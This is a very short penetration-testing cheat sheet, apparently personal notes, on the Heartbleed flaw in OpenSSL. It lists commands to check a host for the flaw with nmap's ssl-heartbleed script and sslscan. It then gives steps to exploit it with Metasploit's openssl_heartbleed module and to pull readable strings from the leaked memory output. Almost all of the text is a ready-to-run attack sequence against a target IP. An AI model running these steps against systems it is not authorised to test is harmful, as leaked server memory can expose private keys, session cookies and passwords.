## Check for Expoit presense
	nmap --script ssl-heartbleed $ip
	sslscan $ip:443
## Exploit
	msf > use auxiliary/scanner/ssl/openssl_heartbleed
		show actions
	strings $output